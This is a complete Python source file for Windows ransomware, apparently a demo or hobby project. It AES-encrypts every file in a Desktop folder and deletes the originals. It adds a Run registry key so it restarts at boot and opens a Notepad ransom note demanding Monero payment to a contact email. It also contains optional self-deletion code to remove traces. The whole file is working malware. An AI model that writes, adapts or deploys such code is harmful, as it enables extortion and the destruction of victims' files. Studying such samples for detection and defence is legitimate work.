import os
import subprocess
import sys
import winreg
from time import sleep
from random import uniform
import getpass
import pyAesCrypt

# 128 bit / 16 byte key required
key = b'whoops_whoops_69'

# Directory to encrypt
dir_path = f'C:\\Users\\{getpass.getuser()}\\Desktop\\EncryptThis'

# Ransom steps file name
ransom_steps = 'STEPS_TO_DECRYPT'

# Path to decryption steps
notepad_file = os.path.join(dir_path, 'STEPS_TO_DECRYPT.txt')

# Encrypt files in given directory with new extension
def encrypt_files(directory, key):
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file != (ransom_steps + '.txt') and not file.endswith('.whoops'):
                file_path = os.path.join(subdir, file)
                new_file_path = file_path + '.whoops'
                pyAesCrypt.encryptFile(file_path, new_file_path, key.decode(), bufferSize=64*1024)
                os.remove(file_path)

                # Encrypt specified file types
                #if file.endswith('.txt') or file_path.endswith('.docx') or file_path.endswith('.pdf'):
                #    pyAesCrypt.encryptFile(file_path, new_file_path, key.decode(), bufferSize=64*1024)
                #    os.remove(file_path)

# Decrypt encrypted files in given directory back to original
def decrypt_files(directory, key):
    files_decrypted = False
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.whoops'):
                file_path = os.path.join(subdir, file)
                new_file_path = file_path[:-6]
                pyAesCrypt.decryptFile(file_path, new_file_path, key.decode(), bufferSize=64*1024)
                os.remove(file_path)

                # Decrypt specified file types
                #if file_path.endswith('.txt.whoops') or file_path.endswith('.docx.whoops') or file_path.endswith('.pdf.whoops'):
                #    pyAesCrypt.decryptFile(file_path, new_file_path, key.decode(), bufferSize=64*1024)
                #    os.remove(file_path)

                print(f'File {file_path} decrypted successfully.')
                files_decrypted = True
    if files_decrypted:

        # Delete startup registry key once files are decrypted
        key_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
        key_name = 'whoops'
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.DeleteValue(registry_key, key_name)
            winreg.CloseKey(registry_key)
            try:
                with open(os.devnull, 'w') as devnull:
                    # Kill all notepad instances
                    os.system('taskkill /F /im notepad.exe > {} 2>&1'.format(devnull.name))

                    if os.path.isfile(notepad_file):
                        # Remove the decryption steps file if it exists
                        os.remove(notepad_file)
            except PermissionError:
                print('Unable to close notepad.exe. You may close and remove it yourself.') 
            print('Steps for decryption file removed.')
            sleep(uniform(0, 2))
            print('Files decrypted successfully.')
            sleep(uniform(0, 2))
            print("Program startup lock removed.")
            print("You are free. Closing...")
            exit(1)
        except Exception as e:
            print("Unable to remove program startup lock")
            print("Please manually remove the following registry key:")
            print(f"    Key: {key_path}")
            print(f"    Value: {key_name}")
            print("You may delete the decryption steps file from your desktop")
            print(f"    File: {notepad_file}")
            print("You are free. Closing...")
            exit(1)

# Leave no trace; self-destruct
def cleanup_traces(notepad_file):
    # Remove decryption steps file
    remove_notepad_file(notepad_file)

    # Delete startup registry key once files are decrypted
    key_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    key_name = 'whoops'
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.DeleteValue(registry_key, key_name)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print("Unable to remove program startup lock")
        print("Please manually remove the following registry key:")
        print(f"    Key: {key_path}")
        print(f"    Value: {key_name}")

    # Remove the program off user's system
    os.remove(os.path.join(os.path.dirname(__file__), sys.argv[0]))

    # Close the program
    exit(1)

# Remove 'STEPS_TO_DECRYPT.txt' off system
def remove_notepad_file(notepad_file):
    try:
        with open(os.devnull, 'w') as devnull:
            # Kill all notepad instances
            os.system('taskkill /F /im notepad.exe > {} 2>&1'.format(devnull.name))

            if os.path.isfile(notepad_file):
                # Remove the decryption steps file if it exists
                os.remove(notepad_file)
    except PermissionError:
        print('Unable to close notepad.exe. You may close and remove it yourself.')

# Add startup registry
def enable_startup_lock():
    key_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    key_name = 'whoops'
    exe_path = os.path.abspath(sys.argv[0])
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(registry_key)
        print('Start: 1')
    except Exception as e:
        print('Start: 0')

# Main program
def main():
    try:
        if not os.path.exists(dir_path):
            print(f'Directory {dir_path} does not exist. Consider yourself lucky.\nExiting program')
            exit(1)

        # Add registry key to run .exe on Windows startup
        enable_startup_lock()

        # Open Notepad with decrypt instructions
        with open(notepad_file, 'a') as f:
            f.write('''
            -----------------------------------------------------------------------------------------------------------
            YOUR SYSTEM HAS BEEN INFECTED AND YOUR TEXT (.txt) FILES HAVE BEEN ENCRYPTED

            YOU HAVE 24 HOURS TO DECRYPT YOUR FILES. FOLLOW THE FOLLOWING STEPS:

            1. SEND $50 USD WORTH OF MONERO (XMR) TO THE FOLLOWING ADDRESS: <address>

            2. SEND 'PAID' TO THE FOLLOWING EMAIL, ALONG WITH THE ADDRESS YOU SENT WITH TO: 69whoops.decrypt@proton.me
            *WE NEED PROOF OF PAYMENT. FIGURE IT OUT*

            3. YOU WILL GET AN EMAIL BACK WITHIN 12 HOURS WITH THE DECRYPTION KEY. 
            JUST ENTER IT INTO THE PROMPT 'Enter Key: ' IN THE TERMINAL WINDOW, THEN PRESS ENTER

            4. YOU WILL BE NOTIFIED THAT YOUR FILES ARE BEING DECRYPTED IN THE TERMINAL WINDOW

            5. ONCE YOU'RE TOLD TO CLOSE THE WINDOW, YOUR SYSTEM IS NO LONGER INFECTED. TRUST US

            DO NOT ATTEMPT TO DECRYPT WITHOUT THE KEY. DOING SO WILL CAUSE PERMENANT DATA LOSS.

            CLOSING THE TERMINAL WINDOW BEFORE DECRYPTION MAY RESULT IN PERMENANT DATA LOSS
            -----------------------------------------------------------------------------------------------------------
            ''')
        proc = subprocess.Popen(['notepad.exe', notepad_file])
        #notepad_pid = proc.pid

        # Encrypt files in directory
        encrypt_files(dir_path, key)

        print('10 tries remaining')
        i = 10  # Tries

        # 10 tries to enter a valid decryption key
        while i > 0:

            # Prompt for decryption key
            input_key = input('Enter key: ')

            # Decrypt encrypted files if key is correct
            if input_key.encode('utf-8') == key:
                decrypt_files(dir_path, key)
                try:
                    # Leave no trace; self-destruct
                    #cleanup_traces(notepad_file)  # Uncomment this, comment remove_notepad_file(notepad)

                    # Keep script
                    remove_notepad_file(notepad_file)  # Uncomment this, comment cleanup_traces(notepad_file)
                except PermissionError:
                    print('Unable to close notepad.exe. You may close it yourself.')
                break
            else:
                print(f'Invalid key. Unable to decrypt files.\nYou have {i-1} tries remaining.')

                # Ran out of tries
                if i == 1:
                    print("You have ran out of tries.")
                    
                    # Leave no trace; self-destruct
                    #cleanup_traces(notepad_file)  # Uncomment this, comment remove_notepad_file(notepad_file)

                    # Keep script, small cleanup
                    remove_notepad_file(notepad_file)  # Uncomment this, comment cleanup_traces(notepad_file)
                    exit(1)

            # Countdown
            i -= 1

    # If user does 'Ctrl + C':
    except KeyboardInterrupt:
        # Leave no trace; self-destruct
        #cleanup_traces(notepad_file)  # Uncomment this, comment remove_notepad_file(notepad_file)

        # Keep script, small cleanup
        remove_notepad_file(notepad_file)  # Uncomment this, comment cleanup_traces(notepad_file)

if __name__ == '__main__':
    main()